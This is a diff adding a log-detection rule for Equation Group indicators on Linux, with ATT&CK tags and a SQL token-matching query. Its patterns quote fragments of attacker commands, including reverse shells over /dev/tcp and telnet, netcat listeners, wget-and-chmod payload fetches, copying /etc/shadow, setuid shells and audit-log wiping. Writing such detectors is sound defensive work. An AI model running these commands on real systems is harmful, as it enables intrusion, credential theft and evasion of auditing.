@@ -1,0 +1,13 @@
+id: 41e5c73d-9983-4b69-bd03-e13b67e9623c
+name: Equation Group Indicators
+level: 8
+size: '>0'
+active: true
+author:
+- Florian Roth (Nextron Systems)
+group: linux
+tags:
+- attack.execution
+- attack.g0020
+- attack.t1059.004
+rule: SELECT * FROM logs WHERE hasToken(full_log, 'chown root%chmod 4777 ') OR hasToken(full_log, 'cp /bin/sh .;chown') OR hasToken(full_log, 'chmod 4777 /tmp/.scsi/dev/bin/gsh') OR hasToken(full_log, 'chown root:root /tmp/.scsi/dev/bin/') OR hasToken(full_log, 'chown root:root x;') OR hasToken(full_log, '/bin/telnet locip locport < /dev/console | /bin/sh') OR hasToken(full_log, '/tmp/ratload') OR hasToken(full_log, 'ewok -t ') OR hasToken(full_log, 'xspy -display ') OR hasToken(full_log, 'cat > /dev/tcp/127.0.0.1/80 <<END') OR hasToken(full_log, 'rm -f /current/tmp/ftshell.latest') OR hasToken(full_log, 'ghost\_% -v ') OR hasToken(full_log, ' --wipe > /dev/null') OR hasToken(full_log, 'ping -c 2 %; grep % /proc/net/arp >/tmp/gx') OR hasToken(full_log, 'iptables % OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;') OR hasToken(full_log, '> /var/log/audit/audit.log; rm -f .') OR hasToken(full_log, 'cp /var/log/audit/audit.log .tmp') OR hasToken(full_log, 'sh >/dev/tcp/% <&1 2>&1') OR hasToken(full_log, 'ncat -vv -l -p % <') OR hasToken(full_log, 'nc -vv -l -p % <') OR hasToken(full_log, '< /dev/console | uudecode && uncompress') OR hasToken(full_log, 'sendmail -osendmail;chmod +x sendmail') OR hasToken(full_log, '/usr/bin/wget -O /tmp/a http% && chmod 755 /tmp/cron') OR hasToken(full_log, 'chmod 666 /var/run/utmp~') OR hasToken(full_log, 'chmod 700 nscd crond') OR hasToken(full_log, 'cp /etc/shadow /tmp/.') OR hasToken(full_log, '</dev/console |uudecode > /dev/null 2>&1 && uncompress') OR hasToken(full_log, 'chmod 700 jp&&netstat -an|grep') OR hasToken(full_log, 'uudecode > /dev/null 2>&1 && uncompress -f % && chmod 755') OR hasToken(full_log, 'chmod 700 crond') OR hasToken(full_log, 'wget http%; chmod +x /tmp/sendmail') OR hasToken(full_log, 'chmod 700 fp sendmail pt') OR hasToken(full_log, 'chmod 755 /usr/vmsys/bin/pipe') OR hasToken(full_log, 'chmod -R 755 /usr/vmsys') OR hasToken(full_log, 'chmod 755 $opbin/%tunnel') OR hasToken(full_log, 'chmod 700 sendmail') OR hasToken(full_log, 'chmod 0700 sendmail') OR hasToken(full_log, '/usr/bin/wget http%sendmail;chmod +x sendmail;') OR hasToken(full_log, '&& telnet % 2>&1 </dev/console')
